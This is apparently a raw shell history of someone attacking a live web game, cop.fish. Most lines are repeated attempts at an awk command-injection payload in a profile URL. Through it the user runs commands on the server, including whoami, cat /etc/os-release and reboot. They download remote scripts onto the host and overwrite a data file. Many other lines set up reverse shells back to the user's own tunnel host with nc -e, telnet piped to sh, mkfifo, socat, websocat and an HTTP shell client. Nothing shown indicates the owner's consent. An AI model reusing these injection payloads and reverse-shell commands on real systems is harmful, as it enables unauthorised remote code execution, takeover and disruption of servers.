curl -s -D - -o /dev/null https://jeopardy.bashsta.cc/login
curl -s -D - -o /dev/null https://jeopardy.bashsta.cc/login  -X POST  -F 'username=something'
curl -X POST -F 'username=something' -s -D - -o /dev/null https://jeopardy.bashsta.cc/login
curl -F 'username=something' -s -D - -o /dev/null https://jeopardy.bashsta.cc/login
curl -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=something' -s -D - -o /dev/null https://jeopardy.bashsta.cc/login
curl -H 'Content-Type: application/x-www-form-urlencoded' -d 'room_code=inf' -b 'username=Hi' -s -D - -o /dev/null https://jeopardy.bashsta.cc/buzz
ls
ls /mnt
ls /mnt/Dev
ls /mnt/Dev/3D
ls /mnt/Dev\\3D
ls /mnt/Dev\3D
awk '{system("ls")}' file.cfg
awk '{system("ls")}' tmp.PcMJgLct2I 
rm -rf tmp.PcMJgLct2I
awk '{system("touch test.txt")}' tmp.PcMJgLct2I 
pkill awk
awk '{system("touch test.txt")}' "Downloads/2024-07-06 09-59-15.mkv" 
clear
# curl -H 'Content-Type: application/x-www-form-urlencoded' -d 'room_code=inf%2f%2e%2e%2f%2e%2e' -b 'username=Hi' -s -D - -o /dev/null https://jeopardy.bashsta.cc/buzz
cd Downloads/
touch some.tzt
mv some.tzt some.txt
awk '{system("touch test.txt")}' some.txt 
ls
vim some.txt
awk '{system("touch test.txt")}' some.txt 
ls
awk --help
touch "\"system()\""
ls
touch "\"+system(\"ls\")+\""
ls
rm -rf `"+system("ls")+"`
rm -rf `"system()"`
clear
ls
clear
awk '{ print "r["$1"]=\"'$filename'\";" }'<\n>
awk '{ print "r["$1"]=\"'$filename'\";" }'
awk '{ print "r["$1"]=\"'$filename'\";" }' some.txt 
cd Downloads
clear
nvim target.sh
source target.sh
bash
./target.sh
ls
git clonehttps://github.com/cgsdev0/fishing-data.git
git clone https://github.com/cgsdev0/fishing-data.git
ls
ls fishing-data
git clone https://github.com/cgsdev0/copfish.git
mv fishing-data/ copfish/
cd copfish/
ls
./start.sh
vim start.sh
ls
ls fishing-data
ls fishing-data/badcop_
tac "$PROFILE"
curl https://cop.fish/api/fishdex/InfiniteCoder01
curl https://cop.fish/profile/InfiniteCoder01
curl https://cop.fish/profile/InfiniteCoder01 | rg InfiniteCoder01
curl "https://cop.fish/profile/InfiniteCoder01 "
curl --path-as-is "https://cop.fish/profile/InfiniteCoder01 "
curl --path-as-is 'https://cop.fish/profile/InfiniteCoder01"'
curl --path-as-is 'https://cop.fish/profile/InfiniteCoder01?load=rest'
# curl --path-as-is 'https://cop.fish/profile/InfiniteCoder01?load=rest'
tac --help
tac --version
nvim target.sh
z Down
cd Downloads/
ls
curl --path-as-is 'https://cop.fish/profile/--version'
curl --path-as-is 'https://cop.fish/profile/";system("ls");print"'
curl --path-as-is 'https://cop.fish/profile/";}else{system("ls");}if ( $3 == 0 ) { print"'
curl --path-as-is 'https://cop.fish/profile/{";}else{system("ls");}if ( $3 == 0 ) { print"}'
curl -g 'https://cop.fish/profile/";}else{system("ls");}if ( $3 == 0 ) { print"'
curl --globoff 'https://cop.fish/profile/";}else{system("ls");}if ( $3 == 0 ) { print"'
curl -g 'https://cop.fish/profile/";else system("ls");if ( $3 == 0 )  print"'
curl -g 'https://cop.fish/profile/";else system("ls");if  $3 == 0   print"'
curl -g 'https://cop.fish/profile/";else system("ls");if  3 == 0   print"'
curl -g 'https://cop.fish/profile/";else system("ls");if  3 0   print"'
curl -g 'https://cop.fish/profile/";else system("ls");if     print"'
curl -g 'https://cop.fish/profile/"; system("ls"); print"'
curl --path-as-is 'https://cop.fish/profile/";system("ls");print"'
curl --globoff 'https://cop.fish/profile/";}else{system("ls");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("cat InfiniteCoder01");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("cat\"InfiniteCoder01\"");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("cat%20InfiniteCoder01\");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("ls%20-la\");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("ls%20&-la\");}if($3==0){print"'
decodeurl
curl --globoff 'https://cop.fish/profile/";}else{system("ls\");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("ls");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("cat%20InfiniteCoder01");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("cat%20InfiniteCoder2");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("cat%20InfiniteCoder01");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("rsh%20--version");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("which%20rsh");}if($3==0){print"'
sudo ifconfig
cloudflared
nvim ~/.dotfiles/system/packages.nix
ls
cd ..
ls
mkdir .cloudflared
sudo nixos-rebuild switch
cloudflared tunnel login
ls ~/.cloudflared
ls -la ~/.cloudflared
cloudflared tunnel --help
cloudflared tunnel run testing
cloudflared tunnel token testing
vim .cloudflared/config.yml
cloudflared tunnel token testing --credentials-file ~/.cloudflared/db2873ea-1821-4f90-ad2a-9b437245ffa4.json
cloudflared tunnel token --credentials-file ~/.cloudflared/db2873ea-1821-4f90-ad2a-9b437245ffa4.json testing
cloudflared tunnel route ip add localhost:8080 testing
cloudflared tunnel route ip show
cloudflared tunnel route ip add http://localhost:8080
cloudflared tunnel route ip add http://localhost:8080 testing
cloudflared tunnel route ip add localhost/8080 testing
cloudflared tunnel run testing
ls
python -m http.server
python -m http.server -p 8080
python -m http.server --help
python -m http.server -b 0.0.0.0:8080
python -m http.server -b 8080
dig +short testing.infinitecoder.org
dig +short
dig +short testing.infinitecoder.org
host
host testing.infinitecoder.org
curl 104.21.54.194:8080
curl http://104.21.54.194:8080/
telnet testing.infinitecoder.org 8080 | /bin/sh | telnet testing.infinitecoder.org 8081
nix shell nixpkgs#telnet
nc -lvp 8080<\n>
nc -lvp 8080
nc --help
netcat
nc
netcat
nc
exit
nix shell nixpkgs#netcat
nix run nixpkgs#netcat
nix run nixpkgs#netcat -lvp 8080
nix run nixpkgs#netcat -- -lvp 8080
nc -lvp 8080
nc -vp 8080
nc -v 8080
nc --help
nc -v
nc -l
nc -p
nc -lvp 8080
nc -lvp localhost 8080
telnet testing.infinitecoder.org 8080 | /bin/sh | telnet testing.infinitecoder.org 8081
python -m http.server 8080
clear
nix shell nixpkgs#inetutils
cargo install rustcat
nc testing.infinitecoder.org 8080 -e sh
nc testing.infinitecoder.org 8080 -ce sh
nc 0.0.0.0 8080 -e sh
rcat listen 8080
nc 0.0.0.0 8080 -ce sh
rcat listen 8080
nc -c sh 0.0.0.0 8080
busybox
busybox nc 10.10.10.10 9001 -e sh
busybox nc 0.0.0.0 8080 -e sh
busybox nc testing.infinitecoder.org 8080 -e sh
busybox nc -zv testing.infinitecoder.org 8080 -e sh
busybox nc -z -v testing.infinitecoder.org 8080
busybox nc -z -v -e sh testing.infinitecoder.org 8080
busybox nc -z -v testing.infinitecoder.org 8080 -e sh
busybox nc -z -v localhost 8080 -e sh
rcat listen 8080
busybox nc -z -v testing.infinitecoder.org 8080 -e sh
basename C='curl -Ns telnet://10.10.10.10:9001'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
basename "C='curl -Ns telnet://10.10.10.10:9001'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null"
rcat connect -s sh 10.10.10.10 9001
rcat connect -s sh testing.infinitecoder.org 8080
busybox nc -z -v testing.infinitecoder.org 8080 -e sh
TF=$(mktemp -u);mkfifo $TF && telnet 0.0.0.0 8080 0<$TF | sh 1>$TF
bash
bash -c "TF=$(mktemp -u);mkfifo $TF && telnet 0.0.0.0 8080 0<$TF | sh 1>$TF"
rcat listen 8080
bash -c "TF=$(mktemp -u);mkfifo $TF && telnet testing.infinitecoder.org 8080 0<$TF | sh 1>$TF"
bash -c "TF=$(mktemp -u);mkfifo $TF && telnet 10.21.104.146 8080 0<$TF | sh 1>$TF"
python -m http.server 8080
host testing.infinitecoder.org
ls
bash -c "TF=$(mktemp -u);mkfifo $TF && telnet 10.21.104.146 8080 0"
python3 server.py
ls
python3 client.py
python -m pip install --upgrade urllib3
python3 client.py
nix shell nixpkgs#python3-requests
python3 client.py
echo a | awk 'BEGIN{sprintf("https:%c%cgist.githubusercontent.com%cInfiniteCoder01%c48d8a0855bad9c839626d7df36b375d8%craw%c146b91b3af5e5b9bcb4213739cca7938315c74bd%cclient.py",47,47,47,47,47,47,47);}'
echo a | awk 'BEGIN{print(sprintf("https:%c%cgist.githubusercontent.com%cInfiniteCoder01%c48d8a0855bad9c839626d7df36b375d8%craw%c146b91b3af5e5b9bcb4213739cca7938315c74bd%cclient.py",47,47,47,47,47,47,47));}'
echo a | awk 'BEGIN{system(sprintf("wget https:%c%cgist.githubusercontent.com%cInfiniteCoder01%c48d8a0855bad9c839626d7df36b375d8%craw%c146b91b3af5e5b9bcb4213739cca7938315c74bd%cclient.py",47,47,47,47,47,47,47));}'
ls
curl --globoff 'https://cop.fish/profile/";}else{system%28sprintf%28%22wget%20https%3A%25c%25cgist.githubusercontent.com%25cInfiniteCoder01%25c48d8a0855bad9c839626d7df36b375d8%25craw%25c146b91b3af5e5b9bcb4213739cca7938315c74bd%25cclient.py%22%2C47%2C47%2C47%2C47%2C47%2C47%2C47%29%29}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system%28sprintf%28%22wget%20https%3A%25c%25cgist.githubusercontent.com%25cInfiniteCoder01%25c48d8a0855bad9c839626d7df36b375d8%25craw%25c146b91b3af5e5b9bcb4213739cca7938315c74bd%25cclient.py%22%2C47%2C47%2C47%2C47%2C47%2C47%2C47%29%29;}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{print%28sprintf%28%22https%3A%25c%25cgist.githubusercontent.com%25cInfiniteCoder01%25c48d8a0855bad9c839626d7df36b375d8%25craw%25c146b91b3af5e5b9bcb4213739cca7938315c74bd%25cclient.py%22%2C47%2C47%2C47%2C47%2C47%2C47%2C47%29%29;}if($3==0){print"'
echo a | awk 'BEGIN{print(sprintf("https:%c%cgist.githubusercontent.com%cInfiniteCoder01%c48d8a0855bad9c839626d7df36b375d8%craw%c146b91b3af5e5b9bcb4213739cca7938315c74bd%cclient.py",47,47,47,47,47,47,47));}'
echo a | awk 'BEGIN{system(sprintf("wget https:%c%cgist.githubusercontent.com%cInfiniteCoder01%c48d8a0855bad9c839626d7df36b375d8%craw%c146b91b3af5e5b9bcb4213739cca7938315c74bd%cclient.py",47,47,47,47,47,47,47));}'
rm -rf client.py.*
ls
curl --globoff 'https://cop.fish/profile/";}else{print%28sprintf%28%22http%3A%25c%25cgist.githubusercontent.com%25cInfiniteCoder01%25c48d8a0855bad9c839626d7df36b375d8%25craw%25c146b91b3af5e5b9bcb4213739cca7938315c74bd%25cclient.py%22%2C47%2C47%2C47%2C47%2C47%2C47%2C47%29%29;}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("ls%20..");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("uptime");}if($3==0){print"'
echo a | awk 'BEGIN{system(sprintf("cat%20%cetc%cos-release",47,47));}'
echo a | awk 'BEGIN{system(sprintf("cat %cetc%cos-release",47,47));}'
urldecode system(sprintf("cat%20;%%cetc%%cos-release",47,47));
urldecode system(sprintf("cat%20%%cetc%%cos-release",47,47));
urldecode system(sprintf("cat%20%25cetc%25cos-release",47,47));
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("cat%20%25cetc%25cos-release",47,47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{print%20sprintf("cat%20%25cetc%25cos-release",47,47);}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{print(sprintf("cat%20%25cetc%25cos-release",47,47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{print("test");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{print"test";}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("ls");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("cat%20%25cetc%25cos-release",47,47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("uptime");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("find%20%25cusr%20-name%20%27websocat%27",47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{print%28sprintf%28%22http%3A%25c%25cgist.githubusercontent.com%25cInfiniteCoder01%25c48d8a0855bad9c839626d7df36b375d8%25craw%25c146b91b3af5e5b9bcb4213739cca7938315c74bd%25cclient.py%22%2C47%2C47%2C47%2C47%2C47%2C47%2C47%29%29;}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system%28sprintf%28%22wget%20https%3A%25c%25cgist.githubusercontent.com%25cInfiniteCoder01%25c48d8a0855bad9c839626d7df36b375d8%25craw%25c146b91b3af5e5b9bcb4213739cca7938315c74bd%25cclient.py%22%2C47%2C47%2C47%2C47%2C47%2C47%2C47%29%29;}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("ls");}if($3==0){print"'
bash <(websocat) 2>&1 3>&1
websocat
websocat --help
bash <(websocat testing.infinitecoder.org:8080) 2>&1 3>&1
rcat listen 8080
python3 server.py
bash
echo a | awk 'BEGIN{system(sprintf("bash <(websocat wss:%c%ctesting.infinitecoder.org:8080) 2>&1 3>&1",47,47));}'
echo a | awk 'BEGIN{system(sprintf("bash%20<(websocat%20wss:%25c%25ctesting.infinitecoder.org:8080)%202>&1%203>&1",47,47));}'
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("bash%20<(websocat%20wss:%25c%25ctesting.infinitecoder.org:8080)%202>&1%203>&1",47,47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("ls%20%25c",47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system("whoami");}if($3==0){print"'
wget https://raw.githubusercontent.com/JoelGMSec/HTTP-Shell/main/HTTP-Client.sh -o client.sh
ls
wget https://raw.githubusercontent.com/JoelGMSec/HTTP-Shell/main/HTTP-Client.sh -O client.sh
ls
# echo a | awk 'BEGIN{system(sprintf("wget https://raw.githubusercontent.com/JoelGMSec/HTTP-Shell/main/HTTP-Client.sh -O client.sh",47,47));}'
ls
rm -rf *
s
ls
clear
wget https://raw.githubusercontent.com/JoelGMSec/HTTP-Shell/main/HTTP-Client.sh -O client.sh
./client.sh
python3 
git clone https://github.com/JoelGMSec/HTTP-Shell
cd HTTP-Shell/
ls
python HTTP-Server.py 
nix shell nixpkgs#oslex
ls
cp /mnt/Dev/ToolsIUse/Verbose/flake.nix .
ls
cat requirements.txt 
nvim flake.nix 
nix develop -c nu
git add .
nix develop -c nu
nvim flake.nix 
python -m venv
python -m venv .
bin/pip install -r requirements.txt
vim requirements.txt
bin/pip install -r requirements.txt
nix develop -c nu
nvim .
bin/pip install -r requirements.txt
bin/python HTTP-Server.py
./client.sh 0.0.0.0 8080
ls
chmod +x client.sh 
./client.sh 0.0.0.0 8080
bat client.sh 
./client.sh -c 0.0.0.0:8080
./client.sh -c https://0.0.0.0:8080
bat client.sh 
./client.sh
dos2unix client.sh 
exit
bash
./client.sh
bash
nix develop -c nu
dos2unix client.sh 
./client.sh
vim client.sh
bat client.sh 
file client.sh 
vim client.sh
./client.sh
./client.sh -c https://0.0.0.0:8080
./client.sh https://0.0.0.0:8080
./client.sh -c https://0.0.0.0:8080 -s 1
vim client.sh
./client.sh -c https://0.0.0.0:8080 -s 1
bin/python HTTP-Server.py 8080
curl -X POST 0.0.0.0:8080
bin/python HTTP-Server.py 8080
./client.sh -c https://0.0.0.0:8080 -s 1
curl -X POST 0.0.0.0:8080
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("ls%20%25c", 47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("ls%20%25c",47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("ls%20%25chome",47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("ls%20%25chome%25cubuntu",47,47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("ls%20%25cfishing-data",47));}if($3==0){print"'
echo s | awk '{ print(sprintf("wget https:%c%cgist.githubusercontent.com%cInfiniteCoder01%c528bf5630157b8801ea8bf22f6d2bbbd%craw%c94f3168392a7588dfc4c5f10a5d3ebe7ea790a00%cinfinite.txt -O %cfishing-data%cinfinite.txt",47,47,47,47,47,47,47,47,47)); }'
nvim .
echo s | awk (decodeurl 'print(sprintf("wget https:%c%cgist.githubusercontent.com%cInfiniteCoder01%c528bf5630157b8801ea8bf22f6d2bbbd%craw%c94f3168392a7588dfc4c5f10a5d3ebe7ea790a00%cinfinite.txt -O %cfishing-data%cinfinite.txt",47,47,47,47,47,47,47,47,47));')
echo s | awk (urldecode 'print(sprintf("wget https:%c%cgist.githubusercontent.com%cInfiniteCoder01%c528bf5630157b8801ea8bf22f6d2bbbd%craw%c94f3168392a7588dfc4c5f10a5d3ebe7ea790a00%cinfinite.txt -O %cfishing-data%cinfinite.txt",47,47,47,47,47,47,47,47,47));')
echo s | awk (urldecode '{ print(sprintf("wget https:%c%cgist.githubusercontent.com%cInfiniteCoder01%c528bf5630157b8801ea8bf22f6d2bbbd%craw%c94f3168392a7588dfc4c5f10a5d3ebe7ea790a00%cinfinite.txt -O %cfishing-data%cinfinite.txt",47,47,47,47,47,47,47,47,47)); }')
echo s | awk (urldecode '{ print(sprintf("wget https:%25c%25cgist.githubusercontent.com%25cInfiniteCoder01%25c528bf5630157b8801ea8bf22f6d2bbbd%25craw%25c94f3168392a7588dfc4c5f10a5d3ebe7ea790a00%25cinfinite.txt -O %25cfishing-data%25cinfinite.txt",47,47,47,47,47,47,47,47,47)); }')
echo s | awk (urldecode '{ print(sprintf("wget%20https:%25c%25cgist.githubusercontent.com%25cInfiniteCoder01%25c528bf5630157b8801ea8bf22f6d2bbbd%25craw%25c94f3168392a7588dfc4c5f10a5d3ebe7ea790a00%25cinfinite.txt%20-O%20%25cfishing-data%25cinfinite.txt",47,47,47,47,47,47,47,47,47)); }')
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("wget%20https:%25c%25cgist.githubusercontent.com%25cInfiniteCoder01%25c528bf5630157b8801ea8bf22f6d2bbbd%25craw%25c94f3168392a7588dfc4c5f10a5d3ebe7ea790a00%25cinfinite.txt%20-O%20%25cfishing-data%25cinfinite.txt",47,47,47,47,47,47,47,47,47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("ls%20%25cfishing-data",47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("wget%20https:%25c%25cgist.githubusercontent.com%25cInfiniteCoder01%25c528bf5630157b8801ea8bf22f6d2bbbd%25craw%25c94f3168392a7588dfc4c5f10a5d3ebe7ea790a00%25cinfinite.txt%20-O%20%25cfishing-data%25cinfinite.txt",47,47,47,47,47,47,47,47,47));}if($3==0){print"'
curl https://gist.githubusercontent.com/InfiniteCoder01/528bf5630157b8801ea8bf22f6d2bbbd/raw/94f3168392a7588dfc4c5f10a5d3ebe7ea790a00/infinite.txt > /fishing-data/infinite.txt
curl https://gist.githubusercontent.com/InfiniteCoder01/528bf5630157b8801ea8bf22f6d2bbbd/raw/94f3168392a7588dfc4c5f10a5d3ebe7ea790a00/infinite.txt -o /fishing-data/infinite.txt
ls
curl https://gist.githubusercontent.com/InfiniteCoder01/528bf5630157b8801ea8bf22f6d2bbbd/raw/94f3168392a7588dfc4c5f10a5d3ebe7ea790a00/infinite.txt -o infinite.txt
ls
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("curl%20https:%25c%25cgist.githubusercontent.com%25cInfiniteCoder01%25c528bf5630157b8801ea8bf22f6d2bbbd%25craw%25c94f3168392a7588dfc4c5f10a5d3ebe7ea790a00%25cinfinite.txt%20-o%20%25cfishing-data%25cinfinite.txt",47,47,47,47,47,47,47,47,47));}if($3==0){print"'
ls
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("ls%20%25cfishing-data",47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("cat%20%25cfishing-data%25cinfinite.txt",47,47));}if($3==0){print"'
curl https://gist.githubusercontent.com/InfiniteCoder01/528bf5630157b8801ea8bf22f6d2bbbd/raw/94f3168392a7588dfc4c5f10a5d3ebe7ea790a00/infinite.txt -o infinite.txt
ls
clear
ls
python -m server.py
./server.py
chmox +x server.py
chmod +x server.py
clear
curl 0.0.0.0:8080
curl -X POST 0.0.0.0:8080
curl -X POST --data 'test' 0.0.0.0:8080
./server.py
curl 0.0.0.0:8080
curl -X POST --data 'content' 0.0.0.0:8080
./server.py
curl 0.0.0.0:8080
curl -X POST --data 'content' 0.0.0.0:8080
curl 0.0.0.0:8080
curl -X POST --data 'content' 0.0.0.0:8080
./server.py
curl 0.0.0.0:8080
curl -X POST --data 'content' 0.0.0.0:8080
bash client.sh 
bash client.sh 0.0.0.0:8080
bash client.sh 0.0.0.0:8080 10
./client.sh
bash client.sh 0.0.0.0:8080 10
bash client.sh http://0.0.0.0:8080 10
./server.py
bash client.sh http://0.0.0.0:8080 10
./server.py
curl https://gist.githubusercontent.com/InfiniteCoder01/eaae22054cc9ebb91393c5aeee57fdbc/raw/b47ee8c3e5f6eec8a6d4abc72ed7a52fe26ac07b/client.sh -o ser.sh
ls
rm -rf ser.sh
# curl https://gist.githubusercontent.com/InfiniteCoder01/eaae22054cc9ebb91393c5aeee57fdbc/raw/b47ee8c3e5f6eec8a6d4abc72ed7a52fe26ac07b/client.sh -o server.sh
echo s | awk (urldecode '{ print(sprintf("curl%20https:%25c%25cgist.githubusercontent.com%25cInfiniteCoder01%25ceaae22054cc9ebb91393c5aeee57fdbc%25craw%25cb47ee8c3e5f6eec8a6d4abc72ed7a52fe26ac07b%25cclient.sh%20-o%20client.sh",47,47,47,47,47,47,47,47,47)); }')
echo s | awk (urldecode '{ print(sprintf("curl%20https:%25c%25cgist.githubusercontent.com%25cInfiniteCoder01%25ceaae22054cc9ebb91393c5aeee57fdbc%25craw%25cb47ee8c3e5f6eec8a6d4abc72ed7a52fe26ac07b%25cclient.sh%20-o%20client.sh",47,47,47,47,47,47,47)); }')
echo s | awk (urldecode '{ print(sprintf("curl%20https:%25c%25cgist.githubusercontent.com%25cInfiniteCoder01%25ceaae22054cc9ebb91393c5aeee57fdbc%25craw%25cb47ee8c3e5f6eec8a6d4abc72ed7a52fe26ac07b%25cclient.sh%20-o%20client.sh",47,47,47,47,47,47)); }')
echo s | awk (urldecode '{ print(sprintf("curl%20https:%25c%25cgist.githubusercontent.com%25cInfiniteCoder01%25ceaae22054cc9ebb91393c5aeee57fdbc%25craw%25cb47ee8c3e5f6eec8a6d4abc72ed7a52fe26ac07b%25cclient.sh%20-o%20client.sh",47,47,47,47,47,47,47)); }')
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("curl%20https:%25c%25cgist.githubusercontent.com%25cInfiniteCoder01%25ceaae22054cc9ebb91393c5aeee57fdbc%25craw%25cb47ee8c3e5f6eec8a6d4abc72ed7a52fe26ac07b%25cclient.sh%20-o%20client.sh",47,47,47,47,47,47,47));}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("cat%20client.sh",47,47));}if($3==0){print"'
bash client.sh http://testing.infinitecoder.org:8080
bash client.sh https://testing.infinitecoder.org:8080
bash client.sh https://testing.infinitecoder.org:8080 600
curl https://testing.infinitecoder.org
curl https://testing.infinitecoder.org:8080
curl http://testing.infinitecoder.org:8080
./server.py
bash client.sh http://testing.infinitecoder.org:8080 30
curl --globoff 'https://cop.fish/profile/";}else{system(sprintf("bash%20client.sh%20http:%25c%25ctesting.infinitecoder.org:8080%2030",47,47));}if($3==0){print"'
websocat
websocat --help
websocat ws-listen
websocat ws-listen ws://0.0.0.0:8080
websocat ws-listen 0.0.0.0:8080
websocat ws-listen:0.0.0.0:8080
websocat WS-LISTEN:0.0.0.0:8080
websocat WS-LISTEN:ws://0.0.0.0:8080
websocat -s ws-listen:0.0.0.0:8080
websocat -s 0.0.0.0:8080
websocat -s ws-listen://0.0.0.0:8080
websocat -s 0.0.0.0:8080
websocat -s 0.0.0.0:8081
bash <(websocat) 2>&1 3>&1
bash
curl --globoff 'https://cop.fish/profile/";}else{system("reboot");}if($3==0){print"'
cloudflared tunnel run testing
curl --globoff 'https://cop.fish/profile/";}else{print("\n\n\ntest\n\n\n");}if($3==0){print"'
curl --globoff 'https://cop.fish/profile/";}else%20if($1==88){print("\n\n\ntest\n\n\n");}if($3==0){print"'
socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane \<\n>      SYSTEM:'websocat ws://your_websocket_endpoint'
socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane SYSTEM:'websocat ws://0.0.0.0:8081'
websocat -s 0.0.0.0:8081
socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane SYSTEM:'websocat ws://0.0.0.0:8081'
websocat -E -b -s 0.0.0.0:8081
spectacle
socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane SYSTEM:'websocat ws://0.0.0.0:8081'
websocat -E -b ws-l:0.0.0.0:8081 exec:bash
websocat -E -b ws-l:0.0.0.0:8081
websocat -E -b -s 0.0.0.0:8081
socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane SYSTEM:'websocat ws://0.0.0.0:8081'
socat -d -d EXEC:'websocat -t -E ws://0.0.0.0:8081',pty,setsid,ctty
socat EXEC:'websocat -t -E ws://0.0.0.0:8081',pty,setsid,ctty
socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -t -E ws://0.0.0.0:8081'
websocat -t -E -b -s 0.0.0.0:8081 reuseaddr
websocat -t -E -s 0.0.0.0:8081 reuseaddr
websocat -t -E 0.0.0.0:8081 reuseaddr
websocat -t -E ws-listen:0.0.0.0:8081 reuseaddr
websocat -t -E ws-listen:0.0.0.0:8081:reuseaddr
websocat -t -E -s ws://0.0.0.0:8081
websocat -t -E -s 0.0.0.0:8081
socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -t -E ws://0.0.0.0:8081'
socat -,raw,echo=0,escape=0x0f SYSTEM:'websocat ws://0.0.0.0:8081',pty,setsid,ctty,raw,echo=0
websocat -s 0.0.0.0:8081
clear
websocat -s 0.0.0.0:8081
socat TCP-LISTEN:8081,reuseaddr,fork EXEC:'bash -li',pty,setsid,ctty,stderr
socat -,raw,echo=0,escape=0x0f SYSTEM:'websocat ws://0.0.0.0:8081',pty,setsid,ctty,raw,echo=0
socat -,raw,echo=0,escape=0x0f SYSTEM:'websocat ws://0.0.0.0:8081',pty,setsid,ctty,raw,echo=0<\n>
socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -t -E ws://0.0.0.0:8081'
websocat -s 0.0.0.0:8081
socat EXEC:'bash -li',pty,stderr,setsid,ctty,raw,sigint,sane,echo=0 SYSTEM:'websocat -t -E ws://0.0.0.0:8081'
websocat -s 0.0.0.0:8081
socat EXEC:'bash -li',pty,stderr,setsid,ctty,raw,sigint,sane,echo=0 SYSTEM:'websocat -t -E ws://0.0.0.0:8081'
socat EXEC:'bash -li',pty,stderr,setsid,ctty,raw,sigint,sane SYSTEM:'websocat -t -E ws://0.0.0.0:8081'
socat EXEC:'bash -li',pty,stderr,setsid,raw,sigint,sane SYSTEM:'websocat -t -E ws://0.0.0.0:8081'
socat EXEC:'bash -li',pty,setsid,ctty,stderr,setsid,sigint,sane SYSTEM:'websocat -t -E ws://localhost:8081'
clear
websocat -s 0.0.0.0:8081
socat EXEC:'bash -li',pty,setsid,ctty,stderr,setsid,sigint,sane SYSTEM:'websocat -t -E ws://localhost:8081'
tmux new-session -d -s revshell
socat EXEC:'tmux attach -t mysession',pty,setsid,ctty,stderr,setsid,sigint,sane SYSTEM:'websocat -t -E ws://localhost:8081'
socat EXEC:'tmux attach -t revshell',pty,setsid,ctty,stderr,setsid,sigint,sane SYSTEM:'websocat -t -E ws://localhost:8081'
websocat -t -E -s 0.0.0.0:8081
socat EXEC:'tmux attach -t revshell',pty SYSTEM:'websocat -t -E ws://localhost:8081'
socat EXEC:'tmux attach -t revshell' SYSTEM:'websocat -t -E ws://localhost:8081'
socat EXEC:'tmux attach -t revshell',pty SYSTEM:'websocat -t -E ws://localhost:8081'
socat EXEC:'tmux attach -t revshell',pty,setsid,ctty,stderr,setsid,sigint,sane SYSTEM:'websocat -t ws://localhost:8081'
websocat -t -E -s 0.0.0.0:8081
socat EXEC:'tmux attach -t revshell',pty,setsid,ctty,stderr,setsid,sigint,sane SYSTEM:'websocat -t ws://localhost:8081'
socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -t ws://localhost:8081'
socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:8080
socat EXEC:'bash',pty,stderr,setsid,sigint,sane SYSTEM:'websocat -t ws://localhost:8081'
pkill socat
bash
exit
nix shell nixpkgs#socat
exit
nix shell nixpkgs#websocat
exit
exit
nix shell nixpkgs#websocat
exit
nix shell nixpkgs#websocat
clear
clear
socat -d -d file:`tty`,raw,echo=0 SYSTEM:'websocat -s 0.0.0.0:8080'
bash
socat -d -d file:`tty`,raw,echo=0 SYSTEM:'websocat -s 0.0.0.0:8080'
curl --globoff 'https://cop.fish/profile/";}else%20if($1==88){shell("socat%20--version");}if($3==0){print"'
